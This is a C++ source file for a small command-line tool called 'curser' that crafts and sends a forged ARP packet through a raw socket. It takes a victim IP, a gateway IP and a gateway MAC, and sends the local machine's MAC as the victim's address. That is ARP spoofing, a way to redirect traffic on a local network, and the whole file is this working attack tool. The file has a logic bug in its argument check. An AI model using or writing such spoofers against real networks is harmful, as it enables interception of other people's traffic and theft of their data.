#include <iostream>
#include "ll_endp.h"
#include "eth.h"
#include "arp.h"
#include "utils.h"
#include "raw_socket.h"

#define VERSION_MAJOR 0
#define VERSION_MINOR 1
#define VERSION_MICRO 0

#define STRINGIFY0(s) # s
#define STRINGIFY(s) STRINGIFY0(s)

#define VERSION STRINGIFY(VERSION_MAJOR) "." STRINGIFY(VERSION_MINOR) "." STRINGIFY(VERSION_MICRO)


int main(int argc, char** argv) {
    static const char *usage = "Usage:  curser [ -<flag> [<val>] | --<name> <val>] ]...\n\n   "
                                "-i, --interface-name       traffic output interface\n   "
                                "-o, --op-code              type of packet[req/rep]\n   "
                                "    --victim-ip            victim ip address\n   "
                                "    --dst-ip               gateway ip\n   "
                                "    --dst-mac              gateway mac address\n   "
                                "-h, --help                 display usage information and exit\n   "
                                "-v, --version              display version information and exit\n";
    
    std::string_view ifname;
    uint32_t vpa = 0;
    uint32_t gpa = 0;
    uint8_t sha[6] = {0};
    uint8_t gha[6] = {0};
    arp_op op;

    if (argc < 10) {
        if (argc != 2 && (
                        strcmp(argv[1], "-h") != 0 || strcmp(argv[1], "--help") != 0 || 
                        strcmp(argv[1], "-v") != 0 || strcmp(argv[1], "--version") != 0)) {
            std::cout << usage << std::endl;
            return EXIT_FAILURE;
        }
    }
    
    for (int i = 1; i < argc; i++) {
        if (!std::strcmp(argv[i], "-i")) {
            ifname = argv[++i];
        } else if (!std::strcmp(argv[i], "-o") || !std::strcmp(argv[i], "--op-code")) {
            if (!std::strcmp(argv[++i], "req")) {
                op = arp_op::request;
            } else if (!std::strcmp(argv[i], "rep")) {
                op = arp_op::reply;
            } else {
                perror("Invalid op code");
                return EXIT_FAILURE;
            }
        } else if (!std::strcmp(argv[i], "--victim-ip")) {
            vpa = inet_bf(argv[++i]);
        } else if (!std::strcmp(argv[i], "--dst-ip")) {
            gpa = inet_bf(argv[++i]);
        } else if (!std::strcmp(argv[i], "--dst-mac")) {
            std::sscanf(argv[++i], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &gha[0],&gha[1],&gha[2],
                                                                    &gha[3],&gha[4],&gha[5]);
        } else if (!std::strcmp(argv[i], "-h") || !std::strcmp(argv[i], "--help")) {
            std::cout << usage << std::endl;
            return EXIT_SUCCESS;
        } else if (!std::strcmp(argv[i], "-v") || !std::strcmp(argv[i], "--version")) {
            std::cout << "curser version " << VERSION << std::endl;
            return EXIT_SUCCESS;
        }
    }
    
    
    getMacAddr(ifname.data(), sha);
    
    ll_endpoint ep{ifname};
    raw_socket sock{};
    sock.bind(ep);
    
    auto pktBuilder = PktBuilder(op)
                .set_hrd(0x0001)
                .set_pro(0x0800)
                .set_hln(6)
                .set_pln(4)
                .set_sha(sha)
                .set_spa(vpa)
                .set_tpa(gpa)
                .set_tha(gha)
                .set_op(as_integer(op));
    
    sock.sendto(pktBuilder.packet(), pktBuilder.size());
    std::cout << "sent arp packet on the interface " << ep << std::endl;
    return EXIT_SUCCESS;
}
